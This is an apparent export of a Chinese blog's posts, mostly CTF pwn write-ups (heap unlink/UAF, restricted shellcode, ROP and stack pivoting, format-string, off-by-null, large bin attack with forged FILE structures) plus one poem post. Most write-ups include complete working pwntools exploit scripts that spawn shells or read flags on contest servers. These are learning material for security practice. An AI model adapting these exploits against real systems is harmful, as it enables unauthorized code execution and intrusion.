[{"title":"Heap1sEz - 堆漏洞的简单利用","url":"/categories/CTF/heap1sEz/","content":"堆的内部结构\n\n在程序的执行过程中，我们称由 malloc 申请的内存为 chunk\n。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。\n\n/*  This struct declaration is misleading (but accurate and necessary).  It declares a \"view\" into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*/struct malloc_chunk {  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */  struct malloc_chunk* fd;         /* double links -- used only if free. */  struct malloc_chunk* bk;  /* Only used for large blocks: pointer to next larger size.  */  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */  struct malloc_chunk* bk_nextsize;};\n关于堆的结构很重要的一点在于，其使用和 free\n状态下的结构一致，只是相应功能有区别。例如使用时 fd\n段用于存储数据，可以通过某些方法把不合法的数据写入一个 free chunk 的 fd\n中。 \n程序分析\nchecksec\n\n程序开启了 PIE 保护\n程序运行\n\n源码分析\n程序主要由 gift , add , edit ,\nshow , delete 几个函数构成。其中\ngift 函数直接让我们可以进行 __free_hook\n劫持。\nvoid gift(){    printf(\"give me a hook\\n\");    if (scanf(\"%p\", &amp;hook) &lt;= 0)        _exit(1);}\n因此考虑通过 __free_hook 劫持执行\nsystem('/bin/sh') 得到 shell。\n在 delete\n函数中给定内存块被释放，但是对应的指针没有被设置为 NULL，存在 Use After\nFree 漏洞。\nvoid delete() {    unsigned int index;    printf(\"Index: \");    scanf(\"%u\", &amp;index);    if (index &gt;= 16) {        printf(\"There are only 16 pages in this notebook.\\n\");        return;    }    if (notes[index] == NULL) {        printf(\"Page not found.\\n\");        return;    }    free(notes[index]); //没有置空    return;}\n攻击流程\n泄露程序基址\n由于程序打开了\nPIE，导致程序运行时加载基址不确定。但是由于程序中的偏移仍然不变，我们首先需要泄露程序中\n.text , .data 或者 .bss 中的地址来计算程序基址。这里选择\nmain_arena 进行泄露，因为通过 Unsorted Bin\n的机制会很容易得到。\n申请两个大小为 8 的 chunk，分别为 1、2， 然后释放后放入 Unsorted\nBin。这里 chunk1 的 fd 就会指向某个与 main_arena\n有关的地址。经过动态调试得知， 它指向\n&amp;main_arena - 0x08。\n不过目前我还不明白，为什么只有一个 chunk\n的时候无法泄露出地址，可能是只有一个 chunk 的时候只需要在\nmain_arena.bins 中存储相关指针即可。\n泄露 libc 基址\n得到程序基址后，为了得到 system 函数的地址，还需要获得\nlibc 基址。而程序中唯一可利用的输出函数位于 show 函数中\nvoid show() {    unsigned int index;    printf(\"Index: \");    scanf(\"%u\", &amp;index);    if (index &gt;= 16) {        printf(\"There are only 16 pages in this notebook.\\n\");        return;    }    if (notes[index] == NULL) {        printf(\"Page not found.\\n\");        return;    }    puts(notes[index]); //可以利用    return;}\n我们需要尝试将 notes[index] 修改为一个 got\n表中的值，例如 read@got[plt] 。\n利用 unlink 实现任意地址读写\nunlink_chunk (mchunkptr p){  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (\"corrupted size vs. prev_size\");  mchunkptr fd = p-&gt;fd;                                                   mchunkptr bk = p-&gt;bk;  //if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    //malloc_printerr (\"corrupted double-linked list\");  fd-&gt;bk = bk;  bk-&gt;fd = fd;}\n\n\nFD=P-&gt;fd = target addr - 0x18\nBK=P-&gt;bk = expect value\nFD-&gt;bk = BK，即 *(target addr- 0x18+ 0x18)=BK=expect value\nBK-&gt;fd = FD，即 *(expect value +0x10) = FD = target addr-\n0x18\n\n\n在 64 位程序里，chunk 每个字段占 8 个字节。\n由于程序中存在 UAF 漏洞，只需要申请两个\nchunk，大小为 16（或者更大）。删除 chunk1 后编辑\nchunk1 覆盖 fd, bk 的值，随后删除 chunk2。此时会发生前向合并，执行\nunlink 相关代码。\n不过这里在测试时发生了段错误，如下图：\n\n后来发现是因为 got 表中\n&lt;read@got[plt]+0x10&gt; 的值被修改了，而这个位置恰好存储\n__printf_chk\n函数的地址，导致程序意外跳转到了一个不可执行的位置。所以尝试泄露其他 libc 函数的地址，并且在它后 0x10 处的函数不会在后面的攻击过程中执行。\n\n\n.got\n\n执行 system('/bin/sh')\n传参\n观察 __free_hook 相关的代码，可以发现\nvoid delete() {    //...    free(notes[index]);    return;}void free(void *mem){  mchunkptr p;                 /* chunk corresponding to mem */  INTERNAL_SIZE_T size;        /* its size */  mchunkptr nextchunk;         /* next contiguous chunk */  INTERNAL_SIZE_T nextsize;    /* its size */  int nextinuse;               /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */  mchunkptr bck;               /* misc temp for linking */  mchunkptr fwd;               /* misc temp for linking */  if (__builtin_expect (hook != NULL, 0))  {    (*hook)(mem);    return;  }    //...\n只需要将 mem 对应的位置修改为 '/bin/sh'\n即可，而使用程序中自带的 edit 功能就能实现。\n__free_hook 劫持\n这题直接提供了后门函数 gift 用于修改\n&amp;hook 上的值。\nexp\nfrom pwn import *context.log_level = \"debug\"context.arch = \"amd64\" libc = ELF(\"./libc.so.6\")p = process(\"./vuln\")#p = remote(\"182.202.178.28\",31639)#gdb.attach(p)def add(index,size):    p.sendline(b\"1\")    p.sendlineafter(\"Index:\",str(index))    p.sendlineafter(\"Size: \",str(size))def dele(index):    p.sendline(b\"2\")    p.sendlineafter(\"Index:\",str(index))def edit(index,content):    p.sendline(b\"3\")    p.sendlineafter(\"Index:\",str(index))        p.sendlineafter(\"Content: \",content)def show(index):    p.sendline(b\"4\")    p.sendlineafter(\"Index:\",str(index))add(2,8)add(3,8)dele(2)dele(3)show(2)bss_addr = u64(p.recvuntil('\\x0a\\x77\\x65',drop=True)[-6:].ljust(8, b'\\x00'))elfbase = bss_addr + 0x8 - 0x3810print(\"bss:\",hex(bss_addr))note = elfbase + 0x3880puts = elfbase + 0x3768add(0,16)add(1,16)dele(0)edit(0,p64(note-0x18)+p64(puts))dele(1)show(0)puts_addr = u64(p.recvuntil('\\x0a\\x77\\x65',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = puts_addr - libc.sym[\"puts\"]sys_addr = libc_base + libc.sym[\"system\"]add(6,8)edit(6,b\"/bin/sh\")p.sendline(b\"6\")p.sendlineafter(b\"give me a hook\\n\",hex(sys_addr))dele(6)p.interactive()\n","categories":["CTF"],"tags":["pwn","heap","unlink","UAF"]},{"title":"shellcode - 有长度限制的 shellcode 解法","url":"/categories/CTF/241103-shellcode/","content":"shellcode\n\nshellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16\n进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode\n常常使用机器语言编写。 \n\n程序分析\n题目来源：第七届浙江省大学生网络与信息安全竞赛预赛\n\n\nimage-20241103161301251\n\nchecksec\n\n\n保护全开\n\n逆向分析\n\n\nIDA 伪代码\n\n程序的功能很直接，执行输入的一段 shellcode，但是有\n0xa 的长度限制。\n并且存在 memmem 函数，检查输入的内容，使用 IDA 继续查看\nunk_203D 的内容，发现是出题人禁止了 syscall\n的机器码。\n\n\nsyscall('0f')\n\n动态调试\n\n在程序执行 shellcode 之后，观察寄存器和栈的情况。当时比赛时发现\nr8 中存有 syscall\n指令的地址，我的一个想法是控制寄存器 rax, rdi,\nrsi, rdx 执行系统调用 read。\nmov rsi,raxxor rax,raxxor rdi,rdiadd rdx,0x50call r8\n不过这样的长度已经超出 0xa 的限制了。后面我又想了很久，想继续利用\nr8 跳转到某个 main 函数上的指令，调试发现从\nr8 到一个 main\n函数的地址需要减去三位十六进制数，也就是说操作数占据了 shellcode 中 0x4\n的长度了。哎，结果我就这样忽视了 rsp 上的\n&lt;main+0132&gt;，一直到比赛结束。\n攻击流程\n这里的思路是白夜学长提供的。\n调整传参寄存器，控制程序流程\nELF 中的 read 函数参数如下\n\n栈中的数据如下\n\n\n由于程序中使用 call\nrax 执行 shellcode，返回地址存在栈顶\n\n第一段 shellcode\npop rdx; 返回地址出栈pop rdi; fdpop rsi; 将不需要的数据出栈pop rsi; *buf &lt;- shellcode addresssud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;call rdx\n将程序跳转到 main 函数的 call _read 前:\n\n执行 shellcode\n没有了读入限制后，直接使用 pwntool 生成的 shellcode 即可。\nExploit\nfrom pwn import *context.log_level = \"debug\"context.arch = \"amd64\"p = process(\"./shellcode1\")#p = remote(\"139.155.126.78\", \"38681\")shellcode = \"\"\"pop rdx;pop rdi;pop rsi;pop rsi;sub rdx, 0x41;call rdx;\"\"\"gdb.attach(p)p.sendafter(b\"input\", asm(shellcode))shellcode = \"\"\"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;\"\"\" #10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)shellcode += shellcraft.sh()p.send(asm(shellcode))p.interactive()\n小结\n这回的省赛属于是坐了四小时大牢了。每道题目或者是在现实实践中，自然是与之前遇到的情况会有不同。因此对程序动态运行中的各种状态应该敏锐一些，例如栈、寄存器，可能会有发现。\n","categories":["CTF"],"tags":["pwn","shellcode"]},{"title":"钱塘江边","url":"/categories/%E6%97%A5%E5%B8%B8/20241106-daily/","content":"\n一叶舟轻，双桨鸿惊。水天清、影湛波平。鱼翻藻鉴，鹭点烟汀。过沙溪急，霜溪冷，月溪明。\n重重似画，曲曲如屏。算当年，虚老严陵。君臣一梦，今古空名。但远山长，云山乱，晓山青。\n——《行香子・过七里濑》 \n\n\n\n摄于 2024/11/5 17:18 沿江大道\n","categories":["日常"]},{"title":"DASCTF12 月赛复现","url":"/categories/CTF/dasctf2025-12-wp/","content":"前言\n本次 DASCTF\n12 月赛尝试了 pwn 方向的两道题目，最终还是如愿以偿的爆零了。首先看到题目我就有种陌生的感觉，给定程序是去掉调试符号的，并且有多个函数，大大降低了可读性，和我先前遇见的题目有不小的区别。\n\nBaseMachine\nchecksec\n\n\n保护全开\n\n逆向分析\n\n\nmain\n\n读入 ./flag 后传入\nsub_3990，图中的乱码是表情，是 IDA 的编码问题。后面是循环读入用户输入，同样传入\nsub_3990。\n进入 sub_3990 继续分析：\n\n\nv9\n\n根据传入的参数 a1, a2\n决定程序后续流程，具体是编码类型 (base64, base85...)。\n有意思的是，程序将字符串的加解密流程放在在 _data\n，即数据段中。\nv10 = ((__int64 (__fastcall *)(char *, const char *))*(&amp;off_7260 + v8))(s, a3);\n.data:0000000000007260 off_7260        dq offset sub_1D6A      ; DATA XREF: sub_3990+155↑o.data:0000000000007260                                         ; sub_3990+1C8↑o.data:0000000000007268                 dq offset sub_1ED6.data:0000000000007270                 dq offset sub_22B2.data:0000000000007278                 dq offset sub_27D4.data:0000000000007280                 dq offset sub_2B94.data:0000000000007288                 dq offset sub_2E17.data:0000000000007290                 dq offset sub_3498.data:0000000000007290 _data           ends.data:0000000000007290\n这涉及到 C 语言中函数指针的概念:\n函数指针是一个指向函数的指针变量，如：\nint (*p)(int x, int  y);\n具有两个整型参数，返回值是整型。\n如下代码实现了通过函数指针调用函数：\nint maxValue (int a, int b) {    return a &gt; b ? a : b;}int (*p)(int, int) = NULL;p = maxValue;p(1, 2);\n而题目程序中就是通过类似这样的函数指针数组实现的。\n接着，根据与 unk_73C0 中的数据比较这一功能可以（应该？）推测是在计算哈希\n\n\nwp 中指出这是在计算 SHA256\n\n如果没有找到相同的，就使用新的槽位：\n\n\n选择最先或未使用的槽位，覆盖该槽位存储的数据\n\n存、读取哈希和密文部分：\n\n解密、输出部分：\n\n\n是否输出由传入参数 a4 决定\n\nVulnerabilities\n与 unk_73C0 读写有关的函数 sub_37A4\n中存在溢出漏洞\n\n\n数组只能储存 0-5\n\n\n\nunk_73c0 将编码类型和明文写入对应位置\n\n攻击流程\n以下为官方 wp 思路。\n寻找具有 'b85' 开头 SHA256 值的字符串，将 flag 槽位上的哈希修改为这个值。具体实现如下（来自官方 wp）：\n#!/usr/bin/env python3from pwncli import *context.terminal = [\"tmux\", \"splitw\", \"-h\", \"-l\", \"122\"]local_flag = sys.argv[1] if len(sys.argv) == 2 else 0if local_flag == \"remote\":    addr = ''    host = addr.split(' ')    gift.io = remote(host[0], host[1])    gift.remote = Trueelse:    gift.io = process('./BaseMachine')    if local_flag == \"nodbg\":        gift.remote = Trueinit_x64_context(gift.io, gift)libc = load_libc()gift.elf = ELF('./BaseMachine')cmd = '''    c'''for i in range(3):    sla(\"🫠🫠🫠\", 'plain b64 ' + str(i))launch_gdb(cmd)sla(\"🫠🫠🫠\", b'plain b85 ' + b'aaaa' * 10 + b'a')ru(\"😍😍😍 \")data = ru(b'\\n', drop=True)pad1 = data[0:5]pad2 = data[-5:]# Match found! String: 6eU, SHA-256: b8509ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888for i in range(1, 8):    sla(\"🫠🫠🫠\", b'b85 plain ' + b'09ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888aaaa' + pad1 * i + pad2 + pad1 * (10 - i))sla(\"🫠🫠🫠\", b'plain b64 6eU')ru(\"😍😍😍 \")flag = ru(b'\\n', drop=True)sla(\"🫠🫠🫠\", b'b64 plain ' + flag)ia()\n总结\n这题的作者可见对编码非常熟悉，目前我还没有对 base 系列有一个太清晰的了解。最多知道它大概的原理，或者仿写加解密的代码之类的。以后有空我会尝试手搓一下各种 base 的加解密的（之前接触 base 是 hgame-mini\n2024 上的一道逆向题 ——base emoji）。另外对代码的阅读能力也有待提升。\n","categories":["CTF"],"tags":["pwn","代码审计","函数指针"]},{"title":"HGAME 2025 Week 1 Writeup","url":"/categories/CTF/hgame-2025-week1-wp/","content":"counting petals\nVulnerabilities\n\n存在越界写入漏洞。 \n\n存在任意读漏洞。\n\nExploit\n观察栈结构，构造数据使 v9=16 时令 v8,\nv9 为不合法的值，从而泄露栈上的 libc 地址。\n第二次循环时利用任意写，构造 ROP 链。\nfrom pwn import *context.log_level = \"debug\"p = remote(\"node2.hgame.vidar.club\",32442)libc = ELF(\"./libc.so.6\")e = ELF(\"./vuln\")pop_rdi_off = 0x2a3e5pop_rsi_off = 0x2be51pop_rdx_r12_off= 0x11f2e7p.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")for i in range(15):    p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(0x1400000013))p.sendlineafter(\"latter:\",str(1))p.recvuntil(b\"+ 1 + \")number = p.recvuntil(b\" +\", drop=True)number = number.decode().strip()libc_address = int(number)log.info(hex(libc_address))libc_base = libc_address - 0x29D90log.info(hex(libc_base))sys_addr = libc_base + libc.sym[\"execve\"]binsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))pop_rdi = libc_base + pop_rdi_offpop_rsi = libc_base + pop_rsi_offpop_rdx_r12 = libc_base + pop_rdx_r12_offp.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")pause()for i in range(15):    p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(0x120000001a))p.sendlineafter(\"the flower number\",str(pop_rdi)) p.sendlineafter(\"the flower number\",str(binsh_addr))p.sendlineafter(\"the flower number\",str(pop_rsi))p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(pop_rdx_r12))p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(binsh_addr))p.sendlineafter(\"the flower number\",str(sys_addr)) p.sendlineafter(\"latter:\",str(1))p.interactive()\nezstack\n根据题目所给的 Dockerfile 获取远程环境相应的 libc:\ndocker build -t pwn:v1 .\n\n禁用 execve\nVulnerabilities\n\n存在栈溢出漏洞。\n\n可以修改 rbp 进行栈迁移。\n\n有大段的可写可读段。\nExploit\n栈迁移到恰当位置，令 fd=4\n泄露 libc 地址，并调整程序读入的长度，方便后续存放 ROP 链。\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",32351)e = ELF(\"./vuln\")libc = ELF(\"./libc-2.31.so\")write_plt = e.plt['write']write_got = e.got['write']writable_addr = 0x404154read_ret = 0x40140fpop_rdi = 0x401713pop_rsi_r15 = 0x401711leave_ret = 0x401425print(\"plt:\",hex(write_plt))print(\"got:\",hex(write_got))pause()payload = b'a' * 80 + p64(writable_addr) + p64(read_ret)p.sendafter(\"Good luck.\",payload)pause()payload = flat({    0x00: [        p64(writable_addr),        p64(pop_rdi),        p64(0x4),        p64(pop_rsi_r15),        p64(write_got),p64(0),        p64(write_plt), #write(4,&lt;write@got&gt;)        p64(read_ret),        p64(leave_ret),    ],    0x50: [        p64(writable_addr-0x50),        p64(leave_ret),    ]})p.send(payload)write_address = u64(p.recvuntil('\\x00\\x00',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = write_address - 0x10e280log.info(hex(libc_base))pop_rdx_r12 = libc_base + 0x119431pop_rsi = libc_base + 0x2601f_read= libc_base + libc.symbols[\"read\"]_open= libc_base + libc.symbols[\"open\"]_write= libc_base + libc.symbols[\"write\"]payload = flat({    0x00: [        p64(0x404154+0xd0),        p64(pop_rsi),        p64(0x404154),        p64(pop_rdx_r12),        p64(0x200),p64(0),         p64(_read),# read(4,buf,0x200)        p64(leave_ret),        p64(leave_ret),    ],    0x50: [        p64(writable_addr-0x50),        p64(leave_ret),    ]})pause()p.send(payload)payload = flat({    0x00: [        p64(0xc0ffee),        p64(pop_rdi),        p64(0x404154+0xe0),        p64(pop_rsi),        p64(0),        p64(pop_rdx_r12),        p64(0),p64(0),        p64(_open), # open(./flag,0,0)        p64(pop_rdi),        p64(0x5),        p64(pop_rsi),        p64(0x404154+0xe0),        p64(pop_rdx_r12),        p64(0x100),p64(0),        p64(_read), #read(5,buf,0x100)        p64(pop_rdi),        p64(0x4),        p64(pop_rsi),        p64(0x404154+0xe0),        p64(pop_rdx_r12),        p64(0x30),p64(0),        p64(_write), #write(4,buf,0x20)    ],    0xd0: [        p64(0x404154),        p64(leave_ret),    ],    0xe0: [        b'./flag\\x00',    ]})pause()p.send(payload)p.interactive()\nformat\nVulnerabilities\n\n格式化字符串漏洞。\n\n\n整型判断，使用无符号整型传入。输入一个负数即可绕过输入长度的限制。\n\n可以栈迁移。\nExploit\n使用 %p 泄露栈的地址，在 vuln\n函数的栈帧内写入更长的格式化字符串，然后控制 rbp\n到合适位置，溢出覆盖返回地址为格式化漏洞处，泄露 libc 地址，再次进入\nvuln 构造 ROP 链。\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",30762)e = ELF(\"./vuln\")libc = ELF(\"./libc.so.6\")leave_ret = 0x4011eemain = 0x4011f0p.sendlineafter(\"you have n chance to getshell\",str(1))p.sendlineafter(\"type something:\",\"%p\")p.recvuntil(b\"you type: 0x\")stack_addr = p.recvuntil(b\"you have\", drop=True)stack_addr = int(stack_addr,16)log.info(hex(stack_addr))rbp = stack_addr + 0x211cp.sendafter(\"n = \",\"-1\\x00\")pause()payload = flat({    0x00: [        b'%9$p',        p64(rbp),        p64(0x4012cf),    ]})p.sendafter(\"type something:\",payload)p.recvuntil(b\"0x\",drop=True)libc_addr = p.recv(12)libc_addr = int(libc_addr,16)libc_base = libc_addr - 0x29d90log.info(hex(libc_base))binsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))sys_addr = libc_base + libc.sym[\"system\"]pop_rdi = libc_base + 0x2a3e5payload = flat({    0x0c: [        p64(0x40101a),        p64(pop_rdi),        p64(binsh_addr),        p64(sys_addr)    ]})p.sendafter(\"type something:\",payload)p.interactive()\nCompress dot new\n题目给出 Nushell 编写的 Huffman 编码，解码代码如下\ndef \"decode\" [tree encoded] {    let bits = ($encoded | split chars)    mut result = []    mut current_node = $tree    for bit in $bits {        $current_node = if $bit == '0' {            $current_node.a        } else { $current_node.b }        if 's' in $current_node {            $result ++= [$current_node.s]            $current_node = $tree        }    }    if 's' in $current_node {        $result ++= [$current_node.s]    }    $result | each { into binary } | bytes collect}def \"decompress\" [] {    let input = (open ./enc.txt --raw | split row \"\\n\")    let tree = $input.0 | from json    let encoded_str = $input.1    decode $tree $encoded_str}decompress | save ./flag.txt --force\n部分内容参考 DeepSeek R1 生成\nTurtle\n\nDIE 检测存在 upx 壳，使用 x64dbg 定位程序入口点后 dump 脱壳。\n程序使用两次 RC4\n加密，依该加密算法的对称性质，第一次加密函数处传入密文得到 key。\n第二次加密函数处将 -= patch 为\n+=，传入密文得到 flag。\n\n","categories":["CTF"],"tags":["pwn","re","hgame"]},{"title":"HGAME 2025 Week 2 Writeup","url":"/categories/CTF/hgame-2025-week2-wp/","content":"Signin2Heap\nVulnerabilities\n\n存在 off-by-null 漏洞，当 prev_size 域复用时，可置零相邻\nchunk 的 prev_inuse 位。\n\n\n只能申请至多 0xFF 大小的堆块，考虑 fastbin attack。\nExploit\n由于程序没有编辑功能，只能使用 add 功能修改堆数据。布置大小分别为\n0xf0, 0x68, 0xf0\n的三个堆块，然后将 0xf0 大小的 tcache bin\n填满。此时释放 chunk 0，将进入 unsorted bin\n。为了泄露出 libc 有关地址，我们需要利用 show 功能输出 freed chunk\n上的指针 (即 fd )。通过如下操作可以实现类似 UAF 的效果：\n\n修改 chunk 2 的 prev_size 和 prev_inuse\n；\n释放 chunk 2，引起向后合并，此时堆管理器认为 chunk 0 ~ chunk 2\n都已经为空闲状态，放入 unsorted bin ；\n先清空优先级更高的 tcache bin ，然后申请 chunk 0\n大小的堆，从 unsorted bin 中取，此时 fd 移动到 chunk 0\n的后面。\n\n经过以上操作后，chunk 1 的位置恰好是 unsorted bin\n的头部。但同时程序逻辑上 chunk 1 并没有被释放，引起了 UAF，double\nfree。\n再次填满 tcache bin ，利用 fastbin double free\n可实现任意写。\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",32253)e = ELF(\"./vuln\")libc = ELF(\"./libc-2.27.so\")def add(index,size,content):    p.sendafter(\"Your choice:\",b\"\\x01\\x00\")    p.sendlineafter(\"Index:\",str(index))    p.sendlineafter(\"Size: \",str(size))    p.sendafter(\"Content: \",content)def show(index):    p.sendafter(\"Your choice:\",b\"\\x03\\x00\")    p.sendlineafter(\"Index:\",str(index))def dele(index):    p.sendafter(\"Your choice:\",b\"\\x02\\x00\")    p.sendlineafter(\"Index:\",str(index))add(0,0xf0,'a')add(1,0x68,'a')add(2,0xf0,'b')for i in range(3,10):  add(i,0xf0,'a')for i in range(3,10): #fill tcache   dele(i)dele(0)dele(1)add(1,0x68,b'a'*0x60+p64(0x170))dele(2)for i in range(3,10):  add(i,0xf0,'a')add(0,0xf0,'a')show(1)main_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = main_arena - 0x3ebca0log.info(hex(libc_base))free_hook = libc_base + libc.symbols['__free_hook']one_gadget = libc_base + 0x4f302add(11,0x30,'a')add(12,0x30,'a')for i in range(3,10):    dele(i)for i in range(3,10):    add(i,0x30,'a')for i in range(3,10): #fill tcache    dele(i)dele(11)dele(12) #a padding chunkdele(1) #fastbin double freefor i in range(3,10):    add(i,0x30,'a') #clear tcacheadd(1,0x30,p64(free_hook))add(12,0x30,'qaq')add(11,0x30,'qaq') #clear padding chunkadd(13,0x30,p64(one_gadget)) #a chunk at &lt;__free_hook&gt;dele(0)p.interactive()\nWhere is the vulnerability\n\n第一次打这么高版本的\nlibc（原谅我当时脑抽看成 2.29，一堆老漏洞用了半天发现不行 hhh）\n\n禁用 execve\nVulnerabilities\n\n明显的 UAF 漏洞。\n\n只能申请 0x500 ~ 0x900 大小的堆，考虑 large bin\nattack。\nExploit\n堆块大小限制导致我们只能使用 unsorted bin 和\nlarge bin，即使通过 UAF 漏洞可以修改堆上的\nsize 从而使其进入 tcache bin\n，但是不能重新申请进行利用。\n显而易见的，可以利用 unsorted bin 的特性快速得到 libc\n基址。\n同时，布置后续的堆块，以进行 large bin attack。\nlarge bin attack 的操作简要描述如下，当然在 how2heap\n中有更好更详细的描述：\n\n申请两个\nchunk，且大小不相同，并在其之后都申请任意大小的堆块，防止释放后合并；\n释放 chunk 0；\n申请一个大于 chunk 0 大小的堆，chunk 0 将进入\nlarge bin；\n释放 chunk 2；\n修改 chunk 0 的 bk_nextsize 为\ntarget - 0x20{sizeof(prev_size + fd + bk + fd_nextsize)}\n。\n重复第三步，chunk 2 将进入 large bin ，由于 chunk 2\n更小，导致操作\nbk_nextsize-&gt;fd_nextsize = &amp;chunk2。\n\n此时就在目标位置写入了 chunk 2 的 prev_size 地址。\n通过一种叫做 House of apple\n的方式，就可以攻击 IO，劫持程序执行流。\n在泄露出 libc 地址后，进而得到 IO_list_all 的地址，利用\nlarge bin attack 将 chunk 地址写入，之后在 chunk 2 上伪造 FILE\n结构体。\n原理部分请自行查找（毕竟我还没完全弄明白）。我们主要关注伪造 IO 的最后一行，它可以让我们跳转到一个地址，即控制一次\n$RIP 。我们的目的是找到一个\ngadget，帮助我们实现栈迁移，执行 ROP 链。\n可以利用的 gadget 如下：\n\n\ngadget 1\n\n动态调试可以发现 $rax 指向 fake_io\n有关地址，因此可以改变 $rdx 的值。\n将 $rdx 改为一处可读写段，执行下一段 gadget：\n\n\ngadget 2.1\n\n\n\ngadget 2.2\n\n修改 $rsp 实现栈迁移，注意在后面会将\n$rcx=[rdx+0xa8]\n入栈，改为一个对后续无影响的可执行地址即可，或者 ROP 的第一个地址。\n最后进入 exit() 触发相关调用链，执行\norw（如此有仪式感的操作自然是手动完成）。\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",31067)e = ELF(\"./vuln\")libc = ELF(\"./libc.so.6\")def add(index,size):    p.sendlineafter(\"5. Exit\",b\"1\")    p.sendlineafter(\"Index:\",str(index))    p.sendlineafter(\"Size: \",str(size))def show(index):    p.sendlineafter(\"5. Exit\",b\"4\")    p.sendlineafter(\"Index:\",str(index))def dele(index):    p.sendlineafter(\"5. Exit\",b\"2\")    p.sendlineafter(\"Index:\",str(index))def edit(index,content):    p.sendlineafter(\"5. Exit\",b\"3\")    p.sendlineafter(\"Index:\",str(index))    p.sendafter(\"Content: \",content)        add(0,0x528)add(1,0x508) #prevent consolidatingadd(2,0x518)add(3,0x721)dele(0)show(0)main_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = main_arena - 0x203b20IO_list_all=libc_base+libc.symbols['_IO_list_all']_IO_stdfile_2_lock=libc_base+0x205700_open=libc_base+libc.sym['open']_read=libc_base+libc.sym['read']_write=libc_base+libc.sym['write']pop_rdi = libc_base + 0x10f75bpop_rsi = libc_base + 0x110a4dpop_rdx = libc_base + 0x66b9a #pop rdx ; ret 0x19gadget = libc_base + 0x176f0esetcontext = libc_base + 0x4a98dret = libc_base + 0x2882flog.info(hex(libc_base))add(4,0x558)dele(2)show(0)chunk_fd = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))edit(0,b'a'*16)show(0)fd_nextsize = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))heap_base = fd_nextsize + 0x10log.info(hex(heap_base))edit(0,p64(chunk_fd)*2+p64(fd_nextsize)+p64(IO_list_all-0x20))add(5,0x558) #large bin attack: write chunk address at targetorw_addr = heap_base + 0x1bf0file_addr = heap_base + 0xa30IO_wide_data_addr=file_addrwide_vtable_addr=file_addr+0xe8-0x68fake_io = b\"\"fake_io += p64(0)  # _IO_read_endfake_io += p64(0)  # _IO_read_basefake_io += p64(0)  # _IO_write_basefake_io += p64(1)  # _IO_write_ptrfake_io += p64(0)  # _IO_write_endfake_io += p64(0)  # _IO_buf_base;fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)fake_io += p64(0)  # _IO_save_basefake_io += p64(0)*3  # from _IO_backup_base to _markersfake_io += p64(0)  # the FILE chain ptrfake_io += p32(2)  # _fileno for stderr is 2fake_io += p32(0)  # _flags2, usually 0fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1fake_io += p16(0)  # _cur_columnfake_io += b\"\\x00\"  # _vtable_offsetfake_io += b\"\\n\"  # _shortbuf[1]fake_io += p32(0)  # paddingfake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lockfake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1fake_io += p64(0)  # _codecvt, usually 0fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1fake_io += p64(0) * 2  # from _freeres_list to __pad5fake_io += p64(orw_addr+0x100) #rdx value(__pad5)fake_io += p32(0xFFFFFFFF)  # _mode, usually -1fake_io += b\"\\x00\" * 19  # _unused2fake_io = fake_io.ljust(0xc8, b'\\x00')  # adjust to vtablefake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # fake vtablefake_io += p64(wide_vtable_addr)fake_io += p64(gadget) #set rdxedit(2,fake_io)orw_payload = flat({    0x00: [        p64(pop_rdi),        p64(orw_addr+0x128),        p64(pop_rsi),        p64(0),        p64(pop_rdx),        p64(0),        p64(_open), # open(./flag,0,0)        b'a'*0x19, # padding        p64(pop_rdi),        p64(3),        p64(pop_rsi),        p64(orw_addr+0x200),        p64(pop_rdx),        p64(0x30),        p64(_read), # read(3,buf,0x30)        b'a'*0x19,        p64(pop_rdi),        p64(1),        p64(pop_rsi),        p64(orw_addr+0x200),        p64(pop_rdx),        p64(0x30),        p64(_write), # write(1,buf,0x30)        b'a'*0x19,    ],    0x120: [        p64(setcontext),        b'./flag\\x00\\x00',    ],    0x1a0: [        p64(orw_addr), #rsp value        p64(ret),    ]})edit(5,orw_payload)edit(1,b'a'*0x500+b' sh;') #reserved for debug, [$rdi]p.interactive()\nHit 